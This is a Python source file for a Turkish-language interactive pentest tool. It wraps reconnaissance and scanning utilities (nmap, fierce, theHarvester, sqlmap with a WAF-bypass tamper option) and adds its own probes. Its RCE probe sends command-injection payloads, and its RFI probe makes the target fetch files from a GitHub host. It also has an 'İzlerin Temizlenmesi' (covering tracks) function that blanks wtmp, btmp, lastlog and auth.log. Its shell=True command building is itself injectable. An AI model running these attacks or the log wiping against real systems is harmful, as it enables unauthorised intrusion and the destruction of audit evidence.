#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
	Ömer Faruk GERİŞ
	Hasan KANBER
	https://github.com/omerfarukgeris/pentest-tool
"""
import os
import subprocess
import time
import signal
import urllib.request
import sys

filee="rapor"
if(os.path.exists("rapor")):	
	filee+=time.strftime("_%Y-%m-%d_%H:%M:%S")
dosya = open(filee,"a")




def banner():
	print("""
	 ____            _            _     _              _ 
      	|  _ \ ___ _ __ | |_ ___  ___| |_  | |_ ___   ___ | |
	| |_) / _ \ '_ \| __/ _ \/ __| __| | __/ _ \ / _ \| |
	|  __/  __/ | | | ||  __/\__ \ |_  | || (_) | (_) | |
	|_|   \___|_| |_|\__\___||___/\__|  \__\___/ \___/|_|
		 
	""")
def yaz(out):
	print('\033[1;32m'+out+'\033[1;m')

def oku(out):
	
	return input('\033[1;32m'+out+'\033[1;m')



def oku_int(out):
	while(True):
		try:
			return int(input('\033[1;32m'+out+'\033[1;m'))
		except ValueError:
			print('\033[1;32mHatalı Girdi\033[1;m')

def cmd(cmd):
	try:
	
		proc = subprocess.Popen(
			args=cmd,
			stdout=subprocess.PIPE,
			stderr=subprocess.PIPE,
			shell=True,
			bufsize=1,
			universal_newlines=True
		)
		(out,err)=proc.communicate()
		

		if(out):
			
			dosya.write(out[1:]+"\n")
			
			print(out)
		if (err):
			yaz("Hata Çıktısı")
			print(err)
			yaz("-"*50)
			
		dosya.write("-"*50+"\n")
	except:
		print("Hata_")


def cmd_out(cmd,begin,end):
	try:
		proc = subprocess.Popen(
			args=cmd,
			stdout=subprocess.PIPE,
			stderr=subprocess.PIPE,
			shell=True,
			bufsize=1, 
			universal_newlines=True
		)
		(out,err)=proc.communicate()

		
		if(out[out.find(begin):out.find(end)]):
			print(out[out.find(begin):out.find(end)])
			dosya.write(out[out.find(begin):out.find(end)]+"\n")
		else:
			print("Sonuç Yok...")

		if (err):
			yaz("Hata Çıktısı")
			print(err),	
			yaz("-"*50)
		dosya.write("-"*50+"\n")
	except:
		print("Hata")	
	


#bilgi toplama fonksiyonlar---------
def fonk_dns():
	while(1):	
		os.system("clear")
		banner();
		print("Parametre olarak girilen etki alanının IP adreslerini, DNS sunucuları, Mail sunucuları, vb bilgileri getirir.\ngoogle.com , facebook.com şeklinde giriniz.\n")
		print("help : Detaylı bilgi")	
		print("q    : Geri\n")
		q = oku("domain(ex. example.com)--> ")
	
		if(q=="help"):
			cmd("dnsenum --help")
			oku("Geri çıkmak için bir tuşa basın--> ")
		elif(q=="q"):
			return	
		elif(q==""):
			continue
		else:
			cmd("dnsenum " +q);
			oku("Geri çıkmak için bir tuşa basın--> ")

def fonk_subdomainFind():
	while(1):
		os.system("clear")
		banner()
		print("Parametre olarak girilen siteye ait subdomainler bulunur.\ngoogl.com, facebook.com gibi giriniz.\n")
		print("help : Detaylı bilgi")	
		print("q    : Geri\n")
		q = oku("domain(ex. example.com)--> ")
	
		if(q=="help"):
			cmd("fierce -h")
			oku("Geri--> ")
		elif(q=="q"):
			return	
		elif(q==""):
			continue
		else:
			cmd_out("fierce -dns " +q,"Now performing","Subnets found");
			oku("Geri çıkmak için bir tuşa basın--> ")
		

def fonk_mailFind():
	while(1):
		os.system("clear")
		banner()
		print("Parametre olarak girilen sitenin etki alanı ile oluşturulan email adresilerini bulur.\ngmail.com, hotmail.com gibi giriniz.\n")
		print("help : Detaylı bilgi")	
		print("q    : Geri\n")
		q = oku("email(ex. @hotmail.com)--> @")
	
		if(q=="help"):
			cmd("theharvester")
			oku("Geri çıkmak için bir tuşa basın--> ")
		elif(q=="q"):
			return			
		elif(q==""):
			continue
		else:
			cmd_out("theharvester -b all -s 0 -l 500 -d "+q,"[+] Email","[+] Hosts")
			oku("Geri çıkmak için bir tuşa basın--> ")
			
		

def fonk_traceroute():
	while(1):
		os.system("clear")
		banner()
		print("Parametre olarak girilen domaine veya IP adresine gönderilen paketler ile \naradaki ağ cihazlarının ipsini basamak basamak yazdırır.\nwww.google.com, www.facebook.com, 178.23.145.56 gibi giriniz.\n")
		print("help : Detaylı bilgi")	
		print("q    : Geri\n")
		q = oku("host--> ")
	
		if(q=="help"):
			cmd("traceroute")
			oku("Geri çıkmak için bir tuşa basın--> ")
		elif(q=="q"):
			return	
		elif(q==""):
			continue		
		else:
			cmd("traceroute "+q)
			oku("Geri çıkmak için bir tuşa basın--> ")
				
		
#-------------bilgi toplama fonksiyonlar

#network fonsiyonlar-------------
def fonk_iptespit():
	while(1):
		os.system("clear")
		banner()
		print("Parametre olarak girilen url adresinin ip adresini döndürür.\nDNS brute force yaparak eğer herhangibir güvenlik cihazı var ise atlatmaya çalışarak gerçek ip ye ulaşmaya çalışır.\nwww.google.com, www.facebook.com şeklinde giriniz\n")
		print("help : Detaylı bilgi")	
		print("q    : Geri\n")
		q = oku("url(www.example.com)--> ")
	
		if(q=="help"):
			cmd("nmap --help")
			oku("Geri çıkmak için bir tuşa basın--> ")
		elif(q=="q"):
			return
		
		else:
			cmd_out("nmap --script=dns-brute  " +q,"DNS Brute-force hostnames:","Nmap done:");
			oku("Geri çıkmak için bir tuşa basın--> ")

def fonk_osfind():
	os.system("clear")
	banner()
	print("Parametre olarak girilen ip adresine sahip cihazın işletim sistemini bulur.\n")
	print("help : Detaylı bilgi")
	print("q    : Geri\n")
	q = oku("ip(71.154.98.23)--> ")
	
	if(q=="help"):
		cmd("nmap --help")
		oku("Geri çıkmak için bir tuşa basın--> ")
	elif(q=="q"):
		return
	else:
		cmd_out("nmap -O " +q,"Device type:","OS detection performed.");
		oku("Geri çıkmak için bir tuşa basın--> ")

def fonk_servisfind():
	os.system("clear")
	banner()
	print("Parametre olarak girilen ip adresine sahip cihaz üzerinde çalışan servis ve uygulamalar hakkında bilgi verir.\n")
	print("help : Detaylı bilgi")
	print("q    : Geri\n")
	q = oku("ip(71.154.98.23)--> ")

	if (q == "help"):
		cmd("nmap --help")
		oku("Geri çıkmak için bir tuşa basın--> ")
	elif (q == "q"):
		return
	else:
		cmd_out("nmap -sV " + q, "PORT", "Service detection");
		oku("Geri çıkmak için bir tuşa basın--> ")

def fonk_allHostfind():
	os.system("clear")
	banner()
	print("Aynı ağdaki tüm cihazları tarar\n")
	print("help : Detaylı bilgi")
	print("q    : Geri\n")
	q = oku("Tara(Enter)--> ")

	if (q == "help"):
		cmd("netdiscover help")
		oku("Geri çıkmak için bir tuşa basın--> ")
	elif (q == "q"):
		return
	else:
		cmd_out("netdiscover ","","");
		oku("Geri çıkmak için bir tuşa basın--> ")



#-------------------network fonsiyonlar


#web fonks

def fonk_sql():
	os.system("clear")
	banner()
	print("Verilen URLde sql injection zafiyetini tarar\n")
	print("help : Detaylı bilgi")
	print("q    : Geri\n")
	q = oku("ex(http://www.example.com/index.php?id=123)--> ")

	if (q == "help"):
		cmd("sqlmap --help")
		oku("Geri çıkmak için bir tuşa basın--> ")
	elif (q == "q"):
		return
	elif(q==""):
		fonk_sql()	
	else:
		cmd("sqlmap --batch --tamper=space2comment -u "+q);
		oku("Geri çıkmak için bir tuşa basın--> ")

def fonk_xss():

	os.system("clear")
	banner()
	print("Verilen URLde xss zafiyetini tarar\n")
	print("q    : Geri\n")
	q = oku("ex(http://www.example.com/index.php?content=name)--> ")

	
	if(q==""):
		fonk_xss()
	elif (q == "q"):
		return
	else:
		payload = open("xss_payload.txt", "r")
		try:	
			for line in payload:
				res = urllib.request.urlopen(q + line).read().decode('utf-8')
				if (res.find(line)):
					print("XSS zafiyeti bulundu...")
					print(q + line)
					dosya.write("XSS zafiyeti bulundu\n")
					dosya.write(q+line+"\n")
					break
		except:
			print("Bağlantı Hatası")
		oku("Geri çıkmak için bir tuşa basın--> ")

def fonk_rfi():


	os.system("clear")
	banner()
	print("Verilen URLde remote file inclusion zafiyetini tarar\n")
	print("q    : Geri\n")
	q = oku("ex(http://www.example.com/index.php?file=index)--> ")

	
	
	if (q == "q"):
		return
	elif(q==""):
		fonk_rfi()	
	else:
		payload = ["php","asp","aspx","html"]
		try:
			for line in payload:
				res = urllib.request.urlopen(q + "https://raw.githubusercontent.com/omerfarukgeris/pentest-tool/master/rfi/rfi."+ line).read().decode('utf-8')
				if (res.find("cGVudGVzdC10b29sCg==")):
					print("RFI zafiyeti bulundu...")
					print(q + "https://raw.githubusercontent.com/omerfarukgeris/pentest-tool/master/rfi/rfi."+line)
					dosya.write("RFI zafiyeti bulundu...\n")
					dosya.write(q + "https://raw.githubusercontent.com/omerfarukgeris/pentest-tool/master/rfi/rfi."+line+"\n")
					break
		except:
			print("Bağlantı Hatası")
		oku("Geri çıkmak için bir tuşa basın--> ")

def fonk_lfi():


	os.system("clear")
	banner()
	print("Verilen URLde local file inclusion zafiyetini tarar\n")
	print("q    : Geri\n")
	q = oku("ex(http://www.example.com/index.php?file=index)--> ")

	
	if (q == "q"):
		return
	elif(q==""):
		fonk_lfi()	
	else:
		cmd("wfuzz -c -z file,lfi.txt --hc 404,500 --hl 0  "+q+"FUZZ");
		oku("Geri çıkmak için bir tuşa basın--> ")

def fonk_rce():


	os.system("clear")
	banner()
	print("Verilen URLde remote code execute zafiyetini tarar\n")
	print("q    : Geri\n")
	q = oku("ex(http://www.example.com/index.php?file=index)--> ")

	
	if (q == "q"):
		return
	elif(q==""):
		fonk_rce()	
	else:
		payload = [";echo+cGVudGVzdC10b29sCg==","| echo+cGVudGVzdC10b29sCg==","&&echo+cGVudGVzdC10b29sCg==","$(echo+echo+cGVudGVzdC10b29sCg==)"]
		try:
			for line in payload:
				res = urllib.request.urlopen(q+line).read().decode('utf-8')
				if (0<res.find("cGVudGVzdC10b29sCg==")):
					print("RCE zafiyeti bulundu...")
					print(q + line )
					dosya.write("RCE zafiyeti bulundu...\n")
					dosya.write(q + line+"\n")
					break
		except:
			print("Bağlantı Hatası")
		oku("Geri çıkmak için bir tuşa basın--> ")


def fonk_exploit():


	os.system("clear")
	banner()
	print("Sistem üzerindeki dosyaları, ayarları, uygulamaları, servisleri, vb\ntarama yaparak var olan zafiyetleri otomatik olarak tarar\n")
	print("q    : Geri\n")
	q = oku("Tara(enter)--> ")

	
	if (q == "q"):
		return
	elif(q==""):
		cmd("./exploit/exploit.py")
		oku("Geri çıkmak için bir tuşa basın--> ")

def fonk_clean():


	os.system("clear")
	banner()
	print("Kayıtlar siliniyor.")
	cmd("echo > /var/log/wtmp")
	cmd("echo > /var/log/btmp")
	cmd("echo > /var/log/lastlog")
	cmd("echo > /var/log/auth.log")
	cmd("echo > /var/log/boot.log")
	cmd("echo >  /var/log/apt/history.log")
	oku("Geri çıkmak için bir tuşa basın--> ")


#menu----------------
def menu_bilgi():
	
	sec=""
	while(sec!=99):
		os.system("clear")
		banner()
		lists=["DNS Bilgileri",
			"Subdomain bul",
			"Mail adresi bul",
			"Traceroute"
			]
		for i in range(len(lists)):
			print(i+1,"-",lists[i])
		print("...\n99 - Geri")
		sec = oku_int("--> ")
		
		if sec > len(lists):
			if sec == 99:
				break
			sec=""			
			continue
		elif lists[sec-1] == lists[0]:
			fonk_dns()
		elif lists[sec-1] == lists[1]:
			fonk_subdomainFind()	
		elif lists[sec-1] == lists[2]:
			fonk_mailFind()	
		elif lists[sec-1] == lists[3]:
			fonk_traceroute()	

		
def menu_network():
	sec=""
	while(sec!=99):
		os.system("clear")
		banner()
		lists=["Ip Tespiti",
			"İşletim Sistemi Bul",
			"Servis ve Uygulama Bilgisi",
			"Ağdaki Tüm Cihazları Bul"
			]
		for i in range(len(lists)):
			print(i+1,"-",lists[i])
		print("...\n99 - Geri")
		sec = oku_int("--> ")
		
		if sec > len(lists):
			if sec == 99:
				break
			sec=""			
			continue
		elif lists[sec-1] == lists[0]:
			fonk_iptespit()
		elif lists[sec-1] == lists[1]:
			fonk_osfind()
		elif lists[sec - 1] == lists[2]:
			fonk_servisfind()
		elif lists[sec - 1] == lists[3]:
			fonk_allHostfind()


def menu_web():
	sec = ""
	while (sec != 99):
		os.system("clear")
		banner()
		lists = ["Sql Injection",
				 "XSS",
				 "LFI",
				 "RFI",
				 "Remote Code Execute"
				 ]
		for i in range(len(lists)):
			print(i + 1, "-", lists[i])
		print("...\n99 - Geri")
		sec = oku_int("--> ")

		if sec > len(lists):
			if sec == 99:
				break
			sec = ""
			continue
		elif lists[sec - 1] == lists[0]:
			fonk_sql()
		elif lists[sec - 1] == lists[1]:
			fonk_xss()
		elif lists[sec - 1] == lists[2]:
			fonk_lfi()
		elif lists[sec - 1] == lists[3]:
			fonk_rfi()	
		elif lists[sec - 1] == lists[4]:
			fonk_rce()		
	
menu_list = [
		"Bilgi Toplama",
		"Network",
		"Web",
		"Exploit",
		"İzlerin Temizlenmesi",
		"Paporlama"

		]

def main_menu():
	
	
	banner()

	for i in range(len(menu_list)):
		print(i+1,"-",menu_list[i])
	print("...\n99 - Cıkış")


	
	

try:
	 	
	sec=""
	while(sec!=99):
		os.system("clear")
		
		main_menu()
		sec = oku_int("--> ")
		if (sec > len(menu_list)):
			if ((sec == 99) | (sec == "q")):
				break
			sec=""
			continue

		elif (menu_list[sec-1] == menu_list[0]):
			menu_bilgi()
		elif (menu_list[sec-1] == menu_list[1]):
			menu_network()
		elif (menu_list[sec-1] == menu_list[2]):
			menu_web()
		elif (menu_list[sec-1] == menu_list[3]):
			fonk_exploit()
		elif (menu_list[sec-1] == menu_list[4]):
			fonk_clean()
		elif (menu_list[sec-1] == menu_list[5]):
			dosya.close()
			print("Rapor yazdırılıyor...")
			os.system("./pdf/txt2pdf.py "+filee)
			
					
			
			break

except IOError:
	print("Dosya okunamadı.")
except KeyboardInterrupt:
	print("İşlem iptal ediliyor.")
except:
	print("Hata oluştu.")
















